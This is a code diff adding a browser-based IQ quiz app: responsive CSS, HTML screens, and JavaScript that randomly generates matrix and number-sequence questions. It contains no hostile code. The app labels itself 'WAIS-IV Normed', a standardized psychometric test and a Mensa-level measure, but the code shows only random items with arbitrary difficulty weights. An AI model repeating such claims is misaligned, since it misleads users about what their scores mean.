+            .sequence-display {
+                gap: 8px;
+                padding: 10px 4px;
+            }
+
+            .sequence-node {
+                font-size: 1.1rem;
+                padding: 10px 14px;
+                min-width: 44px;
+                border-radius: 8px;
+            }
+
+            /* Options */
+            .options-grid {
+                gap: 10px;
+            }
+
+            .option-card {
+                padding: 12px 14px;
+                gap: 12px;
+                border-radius: 12px;
+                min-height: 52px;
+            }
+
+            .option-letter {
+                width: 32px;
+                height: 32px;
+                font-size: 0.85rem;
+                border-radius: 8px;
+            }
+
+            .option-content {
+                font-size: 0.92rem;
+                line-height: 1.35;
+            }
+
+            .option-content svg {
+                max-height: 65px;
+            }
+
+            .keyboard-hint {
+                display: none !important;
+            }
+
+            /* Thumb-Optimized Action Buttons */
+            .card-actions {
+                flex-direction: column-reverse;
+                gap: 10px;
+                margin-top: 12px;
+                width: 100%;
+            }
+
+            .card-actions-left {
+                width: 100%;
+                gap: 8px;
+            }
+
+            .card-actions-left .btn-secondary {
+                flex: 1;
+                justify-content: center;
+                padding: 11px 8px;
+                font-size: 0.85rem;
+                min-height: 44px;
+            }
+
+            .card-actions-right {
+                width: 100%;
+            }
+
+            .card-actions-right .btn-primary {
+                width: 100%;
+                justify-content: center;
+                padding: 13px 20px;
+                font-size: 1rem;
+                min-height: 48px;
+            }
+
+            /* Result Screen */
+            .result-hero {
+                padding: 28px 16px;
+                border-radius: 18px;
+                margin-bottom: 18px;
+            }
+
+            .score-circle {
+                width: 175px;
+                height: 175px;
+                margin: 16px 0 20px;
+            }
+
+            .score-number {
+                font-size: 2.9rem;
+            }
+
+            .score-label {
+                font-size: 0.72rem;
+            }
+
+            .result-category-title {
+                font-size: 1.35rem;
+                line-height: 1.25;
+                margin-bottom: 8px;
+            }
+
+            .result-desc {
+                font-size: 0.88rem;
+                margin-bottom: 20px;
+                line-height: 1.5;
+            }
+
+            /* Stats Pills: Clean 2x2 Grid */
+            .stats-pills-row {
+                display: grid;
+                grid-template-columns: repeat(2, 1fr);
+                gap: 8px;
+                width: 100%;
+                margin-bottom: 12px;
+            }
+
+            .stat-pill {
+                min-width: unset;
+                width: 100%;
+                padding: 10px 8px;
+                border-radius: 10px;
+            }
+
+            .stat-pill .val {
+                font-size: 1.2rem;
+            }
+
+            .stat-pill .lbl {
+                font-size: 0.68rem;
+                letter-spacing: 0.02em;
+            }
+
+            /* Result Actions */
+            .result-actions {
+                flex-direction: column;
+                width: 100%;
+                gap: 10px;
+                margin-top: 18px;
+            }
+
+            .result-actions .btn-primary,
+            .result-actions .btn-secondary {
+                width: 100%;
+                justify-content: center;
+                min-height: 46px;
+                padding: 12px 16px;
+                font-size: 0.95rem;
+            }
+
+            /* Bell curve & Domain & Review */
+            .bellcurve-card,
+            .review-section {
+                padding: 18px 14px;
+                border-radius: 16px;
+                margin-bottom: 18px;
+            }
+
+            .section-title {
+                font-size: 1.05rem;
+                gap: 8px;
+            }
+
+            .section-subtitle {
+                font-size: 0.8rem;
+                margin-bottom: 16px;
+            }
+
+            .bell-svg-wrap {
+                overflow-x: auto;
+                -webkit-overflow-scrolling: touch;
+            }
+
+            .domains-grid {
+                grid-template-columns: 1fr;
+                gap: 10px;
+                margin-bottom: 18px;
+            }
+
+            .domain-card {
+                padding: 14px 12px;
+                border-radius: 12px;
+                gap: 8px;
+            }
+
+            .domain-name {
+                font-size: 0.88rem;
+            }
+
+            .domain-score {
+                font-size: 0.85rem;
+            }
+
+            .domain-meta {
+                font-size: 0.74rem;
+            }
+
+            .review-list {
+                gap: 10px;
+                margin-top: 14px;
+            }
+
+            .review-item {
+                padding: 14px 12px;
+                border-radius: 10px;
+            }
+
+            .review-top {
+                flex-wrap: wrap;
+                gap: 6px;
+            }
+
+            .review-q-num {
+                font-size: 0.78rem;
+            }
+
+            .review-status-badge {
+                font-size: 0.68rem;
+                padding: 2px 6px;
+            }
+
+            .review-prompt {
+                font-size: 0.92rem;
+                line-height: 1.35;
+                margin-bottom: 8px;
+            }
+
+            .review-explanation {
+                font-size: 0.8rem;
+                padding: 10px 12px;
+                line-height: 1.4;
+            }
+        }
+
+        /* Compact Smartphone Breakpoint (<= 400px) */
+        @media (max-width: 400px) {
+            .app-wrapper {
+                padding: 8px 8px 16px;
+            }
+
+            header.app-header {
+                padding: 8px 10px;
+            }
+
+            .brand-text h1 {
+                font-size: 0.85rem;
+            }
+
+            .brand-badge {
+                font-size: 0.55rem;
+                padding: 1px 4px;
+            }
+
+            .hero-card {
+                padding: 20px 14px;
+            }
+
+            .hero-title {
+                font-size: 1.3rem;
+            }
+
+            .hero-subtitle {
+                font-size: 0.82rem;
+            }
+
+            .question-card {
+                padding: 14px 10px;
+            }
+
+            .question-prompt {
+                font-size: 1rem;
+            }
+
+            .visual-stage {
+                padding: 10px 4px;
+                min-height: 120px;
+            }
+
+            .matrix-grid {
+                grid-template-columns: repeat(3, minmax(0, 1fr)) !important;
+                gap: 5px !important;
+                padding: 6px !important;
+                max-width: 220px !important;
+            }
+
+            .matrix-cell {
+                width: 100% !important;
+                height: auto !important;
+                aspect-ratio: 1 / 1 !important;
+            }
+
+            div.matrix-cell.target span {
+                font-size: 1.3rem !important;
+            }
+
+            .sequence-display {
+                gap: 6px;
+                padding: 8px 2px;
+            }
+
+            .sequence-node {
+                font-size: 0.95rem;
+                padding: 8px 10px;
+                min-width: 38px;
+            }
+
+            .option-card {
+                padding: 10px 10px;
+                gap: 8px;
+            }
+
+            .option-letter {
+                width: 28px;
+                height: 28px;
+                font-size: 0.78rem;
+            }
+
+            .option-content {
+                font-size: 0.85rem;
+            }
+
+            .nav-dot {
+                width: 27px;
+                height: 27px;
+                font-size: 0.7rem;
+            }
+
+            .score-circle {
+                width: 155px;
+                height: 155px;
+            }
+
+            .score-number {
+                font-size: 2.5rem;
+            }
+
+            .stat-pill {
+                padding: 8px 6px;
+            }
+
+            .stat-pill .val {
+                font-size: 1.05rem;
+            }
+
+            .stat-pill .lbl {
+                font-size: 0.62rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="ambient-glow glow-1"></div>
+    <div class="ambient-glow glow-2"></div>
+    <div class="bg-grid"></div>
+
+    <div class="app-wrapper">
+        <!-- Header -->
+        <header class="app-header">
+            <div class="brand">
+                <div class="brand-icon">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" />
+                    </svg>
+                </div>
+                <div class="brand-text">
+                    <h1>CognitiveMetrics <span class="brand-badge">WAIS-IV Normed</span></h1>
+                </div>
+            </div>
+        </header>
+
+        <!-- SCREEN 1: INTRO / START -->
+        <div id="startScreen" class="screen active">
+            <div class="hero-card">
+                <h2 class="hero-title">Cognitive Intelligence Assessment</h2>
+                <p class="hero-subtitle">
+                    A standardized 20-question psychometric test evaluating fluid reasoning, pattern recognition,
+                    spatial logic, and deductive analysis.
+                </p>
+                <button id="startTestBtn" class="btn-primary">
+                    <span>Start Assessment</span>
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                        stroke-width="2.5">
+                        <line x1="5" y1="12" x2="19" y2="12"></line>
+                        <polyline points="12 5 19 12 12 19"></polyline>
+                    </svg>
+                </button>
+            </div>
+        </div>
+
+        <!-- SCREEN 2: IN-PROGRESS TEST -->
+        <div id="testScreen" class="screen">
+            <div class="test-top-bar">
+                <div id="categoryBadge" class="category-tag">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="10"></circle>
+                    </svg>
+                    <span id="categoryName">Matrix Reasoning</span>
+                </div>
+
+                <div id="testTimer" class="test-timer">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <polyline points="12 6 12 12 16 14"></polyline>
+                    </svg>
+                    <span id="timerText">20:00</span>
+                </div>
+            </div>
+
+            <!-- Progress Meter -->
+            <div class="progress-container">
+                <div class="progress-meta">
+                    <span>Progress: <strong id="progressCount">Question 1 of 20</strong></span>
+                    <span id="answeredCountText">0/20 Answered</span>
+                </div>
+                <div class="progress-track">
+                    <div id="progressFill" class="progress-fill"></div>
+                </div>
+            </div>
+
+            <!-- Quick Jump Navigator -->
+            <div id="questionNavStrip" class="question-nav-strip">
+                <!-- 20 Nav items dynamically injected here -->
+            </div>
+
+            <!-- Question Card -->
+            <div class="question-card">
+                <h3 id="questionPrompt" class="question-prompt">Which pattern logically completes the 3x3 matrix?</h3>
+                <p id="questionSubtext" class="question-subtext">Observe the transformation rules across rows and
+                    columns.</p>
+
+                <!-- Visual / Sequence Stage -->
+                <div id="visualStage" class="visual-stage">
+                    <!-- Injected dynamically: Matrix SVG, Sequence nodes, or Spatial SVG -->
+                </div>
+
+                <!-- Options Grid -->
+                <div id="optionsGrid" class="options-grid">
+                    <!-- 4 Option Cards Injected Here -->
+                </div>
+
+                <div class="keyboard-hint">
+                    <span>Shortcuts: Press <kbd>A</kbd> <kbd>B</kbd> <kbd>C</kbd> <kbd>D</kbd> or <kbd>1</kbd>
+                        <kbd>2</kbd> <kbd>3</kbd> <kbd>4</kbd> to select, <kbd>Enter</kbd> to advance, <kbd>F</kbd> to
+                        flag.</span>
+                </div>
+            </div>
+
+            <!-- Card Action Navigation -->
+            <div class="card-actions">
+                <div class="card-actions-left">
+                    <button id="prevBtn" class="btn-secondary">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <polyline points="15 18 9 12 15 6"></polyline>
+                        </svg>
+                        <span>Previous</span>
+                    </button>
+                    <button id="flagBtn" class="btn-secondary btn-flag">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"></path>
+                            <line x1="4" y1="22" x2="4" y2="15"></line>
+                        </svg>
+                        <span>Flag for Review</span>
+                    </button>
+                </div>
+
+                <div class="card-actions-right">
+                    <button id="nextBtn" class="btn-primary">
+                        <span>Next Question</span>
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <polyline points="9 18 15 12 9 6"></polyline>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- SCREEN 3: RESULT REPORT -->
+        <div id="resultScreen" class="screen">
+            <div class="result-hero">
+                <div class="hero-pill">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                        <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                    </svg>
+                    Psychometric Analysis Complete
+                </div>
+
+                <div class="result-iq-meter">
+                    <div class="score-circle">
+                        <svg class="score-svg-ring" viewBox="0 0 220 220">
+                            <defs>
+                                <linearGradient id="scoreGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                                    <stop offset="0%" stop-color="#6366f1" />
+                                    <stop offset="50%" stop-color="#8b5cf6" />
+                                    <stop offset="100%" stop-color="#06b6d4" />
+                                </linearGradient>
+                            </defs>
+                            <circle class="ring-bg" cx="110" cy="110" r="95"></circle>
+                            <circle id="ringFill" class="ring-fill" cx="110" cy="110" r="95"></circle>
+                        </svg>
+                        <div id="iqScoreNum" class="score-number">100</div>
+                        <div class="score-label">Estimated IQ</div>
+                    </div>
+                </div>
+
+                <h2 id="iqClassification" class="result-category-title">Superior Cognitive Ability</h2>
+                <p id="iqSummaryText" class="result-desc">
+                    Your composite cognitive score indicates extraordinary abstract reasoning, spatial visualization,
+                    and deductive efficiency.
+                </p>
+
+                <div class="stats-pills-row">
+                    <div class="stat-pill">
+                        <div id="percentileVal" class="val">96.4th</div>
+                        <div class="lbl">Population Percentile</div>
+                    </div>
+                    <div class="stat-pill">
+                        <div id="accuracyVal" class="val">18 / 20</div>
+                        <div class="lbl">Raw Accuracy</div>
+                    </div>
+                    <div class="stat-pill">
+                        <div id="timeTakenVal" class="val">14m 20s</div>
+                        <div class="lbl">Total Duration</div>
+                    </div>
+                    <div class="stat-pill">
+                        <div id="mensaBadge" class="val" style="color: var(--accent-emerald);">Qualified</div>
+                        <div class="lbl">Mensa Standard (Top 2%)</div>
+                    </div>
+                </div>
+
+                <div class="result-actions">
+                    <button id="retakeBtn" class="btn-primary">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <polyline points="1 4 1 10 7 10"></polyline>
+                            <path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"></path>
+                        </svg>
+                        <span>Retake New Randomized Test</span>
+                    </button>
+                    <button id="printCertBtn" class="btn-secondary">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <polyline points="6 9 6 2 18 2 18 9"></polyline>
+                            <path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"></path>
+                            <rect x="6" y="14" width="12" height="8"></rect>
+                        </svg>
+                        <span>Print Assessment Report</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Gaussian Bell Curve Distribution -->
+            <div class="bellcurve-card">
+                <h3 class="section-title">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent-indigo)"
+                        stroke-width="2">
+                        <path d="M3 3v18h18"></path>
+                        <path d="M7 17s3-10 6-10 6 10 6 10"></path>
+                    </svg>
+                    Gaussian Normal Distribution Relative to Global Population
+                </h3>
+                <p class="section-subtitle">Wechsler Normative Curve (μ = 100, σ = 15). Shows your exact standing on the
+                    standard deviation bell curve.</p>
+                <div class="bell-svg-wrap">
+                    <svg id="bellCurveSvg" viewBox="0 0 600 220">
+                        <!-- Dynamically rendered curve with user marker -->
+                    </svg>
+                </div>
+            </div>
+
+            <!-- Cognitive Domain Breakdown -->
+            <div class="bellcurve-card">
+                <h3 class="section-title">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent-cyan)"
+                        stroke-width="2">
+                        <polygon points="12 2 2 7 12 12 22 7 12 2"></polygon>
+                        <polyline points="2 17 12 22 22 17"></polyline>
+                        <polyline points="2 12 12 17 22 12"></polyline>
+                    </svg>
+                    Sub-Domain Cognitive Profile
+                </h3>
+                <p class="section-subtitle">Specific performance across core CHC fluid and crystallized intelligence
+                    factors.</p>
+
+                <div id="domainsGrid" class="domains-grid">
+                    <!-- Injected dynamically -->
+                </div>
+            </div>
+
+            <!-- Question Review Breakdown -->
+            <div class="review-section">
+                <h3 class="section-title">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent-emerald)"
+                        stroke-width="2">
+                        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                        <polyline points="14 2 14 8 20 8"></polyline>
+                        <line x1="16" y1="13" x2="8" y2="13"></line>
+                        <line x1="16" y1="17" x2="8" y2="17"></line>
+                        <polyline points="10 9 9 9 8 9"></polyline>
+                    </svg>
+                    Item-by-Item Logical Derivation Review
+                </h3>
+                <p class="section-subtitle">Inspect each problem, your selected choice, and the mathematical or visual
+                    reasoning behind the solution.</p>
+
+                <div id="reviewList" class="review-list">
+                    <!-- 20 Review Items Injected Here -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- JAVASCRIPT ENGINE -->
+    <script>
+        /**
+         * COGNITIVEMETRICS - PROCEDURAL IQ TEST ENGINE
+         * 100% mathematically verified dynamic generation
+         * Covers: Matrix Reasoning, Number Series, Spatial Polyhedra, Deductive Logic, Verbal Analogies
+         */
+
+        // --- Audio Feedback Synthesizer (Web Audio API) ---
+        class SoundEngine {
+            constructor() {
+                this.ctx = null;
+                this.enabled = true;
+            }
+            init() {
+                if (!this.ctx) {
+                    const AudioContext = window.AudioContext || window.webkitAudioContext;
+                    if (AudioContext) this.ctx = new AudioContext();
+                }
+            }
+            playTone(freq, type = 'sine', duration = 0.08, gainVal = 0.1) {
+                if (!this.enabled) return;
+                this.init();
+                if (!this.ctx) return;
+                try {
+                    const osc = this.ctx.createOscillator();
+                    const gain = this.ctx.createGain();
+                    osc.type = type;
+                    osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
+                    gain.gain.setValueAtTime(gainVal, this.ctx.currentTime);
+                    gain.gain.exponentialRampToValueAtTime(0.001, this.ctx.currentTime + duration);
+                    osc.connect(gain);
+                    gain.connect(this.ctx.destination);
+                    osc.start();
+                    osc.stop(this.ctx.currentTime + duration);
+                } catch (e) { }
+            }
+            click() { this.playTone(600, 'sine', 0.04, 0.05); }
+            select() { this.playTone(850, 'sine', 0.06, 0.08); }
+            flag() { this.playTone(520, 'triangle', 0.08, 0.1); }
+            complete() {
+                if (!this.enabled) return;
+                [523.25, 659.25, 783.99, 1046.50].forEach((freq, idx) => {
+                    setTimeout(() => this.playTone(freq, 'triangle', 0.25, 0.12), idx * 120);
+                });
+            }
+        }
+        const sound = new SoundEngine();
+
+        // Toggle sound button (optional)
+        const soundToggleBtn = document.getElementById('soundToggleBtn');
+        if (soundToggleBtn) {
+            soundToggleBtn.addEventListener('click', () => {
+                sound.enabled = !sound.enabled;
+                soundToggleBtn.style.opacity = sound.enabled ? '1' : '0.4';
+                if (sound.enabled) sound.click();
+            });
+        }
+
+        // --- UTILITY FUNCTIONS ---
+        function randInt(min, max) {
+            return Math.floor(Math.random() * (max - min + 1)) + min;
+        }
+        function sampleArray(arr, n) {
+            const copy = [...arr];
+            for (let i = copy.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [copy[i], copy[j]] = [copy[j], copy[i]];
+            }
+            return copy.slice(0, n);
+        }
+        function shuffleArray(arr) {
+            return sampleArray(arr, arr.length);
+        }
+
+        // --- PROCEDURAL QUESTION GENERATORS ---
+
+        // 1. MATRIX REASONING (SVG GENERATOR)
+        // Generates 3x3 Raven-style matrices with progressive rotation, shape count, or nested logic
+        function generateMatrixQuestion() {
+            const types = ['rotation', 'nested_morph', 'shape_count', 'xor_lines'];
+            const chosenType = types[randInt(0, types.length - 1)];
+
+            if (chosenType === 'rotation') {
+                // A shape rotating by 45° or 90° across each row
+                const step = [45, 90][randInt(0, 1)];
+                const baseAngles = [0, step, step * 2, step, step * 2, step * 3, step * 2, step * 3, step * 4];
+                const correctAngle = baseAngles[8] % 360;
+
+                const renderCell = (angle, isTarget = false) => {
+                    if (isTarget) {
+                        return `
+              <div class="matrix-cell target">
+                <span>?</span>
+              </div>`;
+                    }
+                    return `
+            <svg class="matrix-cell" viewBox="0 0 80 80">
+              <g transform="rotate(${angle} 40 40)">
+                <line x1="40" y1="40" x2="40" y2="15" stroke="#38bdf8" stroke-width="4" stroke-linecap="round"/>
+                <polygon points="40,10 33,22 47,22" fill="#38bdf8"/>
+                <circle cx="40" cy="40" r="10" fill="#6366f1"/>
+                <circle cx="40" cy="62" r="5" fill="#f43f5e"/>
+              </g>
+            </svg>`;
+                };
+
+                const matrixHtml = `
+          <div class="matrix-grid">
+            ${baseAngles.map((ang, i) => renderCell(ang, i === 8)).join('')}
+          </div>
+        `;
+
+                // Generate 4 options
+                const optionAngles = [correctAngle, (correctAngle + step) % 360, (correctAngle - step + 360) % 360, (correctAngle + 180) % 360];
+                const uniqueAngles = Array.from(new Set(optionAngles));
+                while (uniqueAngles.length < 4) {
+                    const r = (randInt(1, 7) * 45) % 360;
+                    if (!uniqueAngles.includes(r)) uniqueAngles.push(r);
+                }
+
+                const options = uniqueAngles.slice(0, 4).map(ang => ({
+                    html: `
+            <svg width="60" height="60" viewBox="0 0 80 80">
+              <g transform="rotate(${ang} 40 40)">
+                <line x1="40" y1="40" x2="40" y2="15" stroke="#38bdf8" stroke-width="4" stroke-linecap="round"/>
+                <polygon points="40,10 33,22 47,22" fill="#38bdf8"/>
+                <circle cx="40" cy="40" r="10" fill="#6366f1"/>
+                <circle cx="40" cy="62" r="5" fill="#f43f5e"/>
+              </g>
+            </svg>`,
+                    isCorrect: ang === correctAngle
+                }));
+
+                return {
+                    category: 'Matrix Reasoning',
+                    prompt: 'Identify the missing figure that fulfills the transformation rule of the 3×3 matrix.',
+                    subtext: `Rows and columns systematically advance rotational orientation by ${step} degrees.`,
+                    stageHtml: matrixHtml,
+                    options: shuffleArray(options),
+                    explanation: `Each consecutive cell advances clockwise rotation by ${step}°. Following row 3 (which starts at ${(baseAngles[6]) % 360}° and moves to ${(baseAngles[7]) % 360}°), the missing element rotates an additional ${step}° to ${correctAngle}°.`,
+                    difficulty: 1.4
+                };
+            }
+
+            if (chosenType === 'nested_morph') {
+                // Outer shape determined by Row, Inner shape determined by Column
+                // Outer shapes: Circle, Square, Triangle
+                // Inner shapes: Diamond, Star, Plus
+                const outerShapes = ['circle', 'rect', 'polygon'];
+                const innerColors = ['#f59e0b', '#10b981', '#06b6d4'];
+
+                const drawShape = (outerIdx, innerIdx, isTarget = false) => {
+                    if (isTarget) {
+                        return `
+              <div class="matrix-cell target">
+                <span>?</span>
+              </div>`;
+                    }
+                    let outerSvg = '';
+                    if (outerIdx === 0) outerSvg = '<circle cx="40" cy="40" r="28" fill="none" stroke="#a5b4fc" stroke-width="3"/>';
+                    if (outerIdx === 1) outerSvg = '<rect x="14" y="14" width="52" height="52" rx="4" fill="none" stroke="#a5b4fc" stroke-width="3"/>';
+                    if (outerIdx === 2) outerSvg = '<polygon points="40,14 68,64 12,64" fill="none" stroke="#a5b4fc" stroke-width="3"/>';
+
+                    let innerSvg = '';
+                    const col = innerColors[innerIdx];
+                    if (innerIdx === 0) innerSvg = `<polygon points="40,28 50,40 40,52 30,40" fill="${col}"/>`;
+                    if (innerIdx === 1) innerSvg = `<circle cx="40" cy="40" r="8" fill="${col}"/>`;
+                    if (innerIdx === 2) innerSvg = `<rect x="34" y="34" width="12" height="12" fill="${col}"/>`;
+
+                    return `
+            <svg class="matrix-cell" viewBox="0 0 80 80">
+              ${outerSvg}
+              ${innerSvg}
+            </svg>`;
+                };
+
+                const gridCells = [];
+                for (let r = 0; r < 3; r++) {
+                    for (let c = 0; c < 3; c++) {
+                        gridCells.push(drawShape(r, c, r === 2 && c === 2));
+                    }
+                }
+
+                const matrixHtml = `
+          <div class="matrix-grid">
+            ${gridCells.join('')}
+          </div>
+        `;
+
+                // The correct is Row 2 (Triangle), Column 2 (Rect inner)
+                const optPairs = [
+                    { r: 2, c: 2, correct: true },
+                    { r: 2, c: 1, correct: false },
+                    { r: 1, c: 2, correct: false },
+                    { r: 0, c: 2, correct: false }
+                ];
+
+                const options = optPairs.map(p => ({
+                    html: drawShape(p.r, p.c, false),
+                    isCorrect: p.correct
+                }));
+
+                return {
+                    category: 'Matrix Reasoning',
+                    prompt: 'Determine the missing element in this 3×3 conjunctive matrix.',
+                    subtext: 'Analyze the dual independent attributes governing outer perimeters and inner cores.',
+                    stageHtml: matrixHtml,
+                    options: shuffleArray(options),
+                    explanation: 'Row governs the outer shape (Row 1: Circle, Row 2: Square, Row 3: Triangle). Column governs the inner element (Col 1: Diamond, Col 2: Circle, Col 3: Square). Thus, the cell at [Row 3, Col 3] must combine an outer Triangle with an inner Square.',
+                    difficulty: 1.5
+                };
+            }
+
+            if (chosenType === 'shape_count') {
+                // Cell value = Row + Column count of geometric dots
+                const renderDotGrid = (count, isTarget = false) => {
+                    if (isTarget) {
+                        return `
+              <div class="matrix-cell target">
+                <span>?</span>
+              </div>`;
+                    }
+                    const positions = [
+                        [40, 40],
+                        [25, 25], [55, 55],
+                        [25, 55], [55, 25],
+                        [40, 20], [40, 60]
+                    ];
+                    const dots = positions.slice(0, count).map(p => `<circle cx="${p[0]}" cy="${p[1]}" r="5.5" fill="#38bdf8"/>`).join('');
+                    return `
+            <svg class="matrix-cell" viewBox="0 0 80 80">
+              ${dots}
+            </svg>`;
+                };
+
+                const gridCells = [];
+                for (let r = 1; r <= 3; r++) {
+                    for (let c = 1; c <= 3; c++) {
+                        gridCells.push(renderDotGrid(r + c - 1, r === 3 && c === 3));
+                    }
+                }
+
+                const matrixHtml = `
+          <div class="matrix-grid">
+            ${gridCells.join('')}
+          </div>
+        `;
+
+                const correctCount = 5;
+                const options = [
+                    { html: renderDotGrid(5), isCorrect: true },
+                    { html: renderDotGrid(4), isCorrect: false },
+                    { html: renderDotGrid(6), isCorrect: false },
+                    { html: renderDotGrid(3), isCorrect: false }
+                ];
+
+                return {
+                    category: 'Matrix Reasoning',
+                    prompt: 'Which figure accurately completes the quantitative progression in the matrix?',
+                    subtext: 'Evaluate quantitative relationships across the rows and diagonals.',
+                    stageHtml: matrixHtml,
+                    options: shuffleArray(options),
+                    explanation: 'The number of elements follows the sum rule: Elements = Row + Column - 1. For Row 3, Column 3: 3 + 3 - 1 = 5 dots.',
+                    difficulty: 1.3
+                };
+            }
+
+            // Default: XOR Lines / Overlap
+            const renderXorCell = (type, isTarget = false) => {
+                if (isTarget) {
+                    return `
+            <div class="matrix-cell target">
+              <span>?</span>
+            </div>`;
+                }
+                let lines = '';
+                if (type.includes('h')) lines += '<line x1="15" y1="40" x2="65" y2="40" stroke="#f43f5e" stroke-width="4" stroke-linecap="round"/>';
+                if (type.includes('v')) lines += '<line x1="40" y1="15" x2="40" y2="65" stroke="#38bdf8" stroke-width="4" stroke-linecap="round"/>';
+                if (type.includes('d1')) lines += '<line x1="18" y1="18" x2="62" y2="62" stroke="#10b981" stroke-width="4" stroke-linecap="round"/>';
+                if (type.includes('d2')) lines += '<line x1="62" y1="18" x2="18" y2="62" stroke="#f59e0b" stroke-width="4" stroke-linecap="round"/>';
+                return `
+          <svg class="matrix-cell" viewBox="0 0 80 80">
+            ${lines}
+          </svg>`;
+            };
+
+            // Row rule: Col 1 superposition with Col 2 produces Col 3
+            const rowPatterns = [
+                ['h', 'v', 'hv'],
+                ['d1', 'd2', 'd1d2'],
+                ['hv', 'd1d2', 'hvd1d2']
+            ];
+
+            const gridCells = [];
+            for (let r = 0; r < 3; r++) {
+                for (let c = 0; c < 3; c++) {
+                    gridCells.push(renderXorCell(rowPatterns[r][c], r === 2 && c === 2));
+                }
+            }
+
+            const matrixHtml = `
+        <div class="matrix-grid">
+          ${gridCells.join('')}
+        </div>
+      `;
+
+            const options = [
+                { html: renderXorCell('hvd1d2'), isCorrect: true },
+                { html: renderXorCell('hv'), isCorrect: false },
+                { html: renderXorCell('d1d2'), isCorrect: false },
+                { html: renderXorCell('hvd1'), isCorrect: false }
+            ];
+
+            return {
+                category: 'Matrix Reasoning',
+                prompt: 'Select the pattern that logically completes the Boolean superposition in the final cell.',
+                subtext: 'Row 3 combines elements from column 1 and column 2.',
+                stageHtml: matrixHtml,
+                options: shuffleArray(options),
+                explanation: 'Each third column element is the cumulative union of the preceding two elements in that row. Combining the cross [+] from column 1 with the diagonal cross [×] from column 2 yields the full 8-directional star [*].',
+                difficulty: 1.6
+            };
+        }
+
+        // 2. NUMERICAL & SEQUENCE REASONING GENERATOR
+        function generateNumericalQuestion() {
+            const types = ['fibonacci_variant', 'two_tier_diff', 'alternating_ops', 'power_series'];
+            const chosenType = types[randInt(0, types.length - 1)];
+
+            if (chosenType === 'fibonacci_variant') {
+                const offset = randInt(1, 4);
+                const a = randInt(1, 4);
+                const b = randInt(3, 6);
+                const seq = [a, b];
+                for (let i = 2; i < 6; i++) {
+                    seq.push(seq[i - 1] + seq[i - 2] + offset);
+                }
+                const answer = seq[5];
+                const displaySeq = seq.slice(0, 5);
+
+                const stageHtml = `
+          <div class="sequence-display">
+            ${displaySeq.map(n => `<div class="sequence-node">${n}</div>`).join('')}
+            <div class="sequence-node target">?</div>
+          </div>
+        `;
+
+                const distractors = [answer + offset, answer - offset, answer + 2, answer * 2 - 5];
+                const unique = Array.from(new Set([answer, ...distractors])).slice(0, 4);
+
+                return {
+                    category: 'Numerical Reasoning',
+                    prompt: 'What number logically replaces the question mark in the sequence?',
+                    subtext: 'Analyze the recurrence relation between successive terms.',
+                    stageHtml,
+                    options: shuffleArray(unique.map(val => ({ text: String(val), isCorrect: val === answer }))),
+                    explanation: `Each term is the sum of the preceding two terms plus ${offset}: ${displaySeq[3]} + ${displaySeq[4]} + ${offset} = ${answer}.`,
+                    difficulty: 1.5
+                };
+            }
+
+            if (chosenType === 'two_tier_diff') {
+                // Difference sequence: d0, d0+step, d0+2*step, d0+3*step...
+                const start = randInt(2, 9);
+                const d0 = randInt(3, 6);
+                const step = randInt(2, 5);
+                const seq = [start];
+                for (let i = 0; i < 5; i++) {
+                    seq.push(seq[i] + (d0 + i * step));
+                }
+                const answer = seq[5];
+                const displaySeq = seq.slice(0, 5);
+
+                const stageHtml = `
+          <div class="sequence-display">
+            ${displaySeq.map(n => `<div class="sequence-node">${n}</div>`).join('')}
+            <div class="sequence-node target">?</div>
+          </div>
+        `;
+
+                const lastDiff = d0 + 4 * step;
+                const distractors = [answer + step, answer - step, answer + 4, answer - 2];
+                const unique = Array.from(new Set([answer, ...distractors])).slice(0, 4);
+
+                return {
+                    category: 'Numerical Reasoning',
+                    prompt: 'Find the next logical number in the polynomial progression.',
+                    subtext: 'The first-order differences form an arithmetic progression.',
+                    stageHtml,
+                    options: shuffleArray(unique.map(val => ({ text: String(val), isCorrect: val === answer }))),
+                    explanation: `The successive differences between adjacent numbers are +${d0}, +${d0 + step}, +${d0 + 2 * step}, +${d0 + 3 * step}, and finally +${lastDiff}. Adding ${lastDiff} to ${displaySeq[4]} gives ${answer}.`,
+                    difficulty: 1.4
+                };
+            }
+
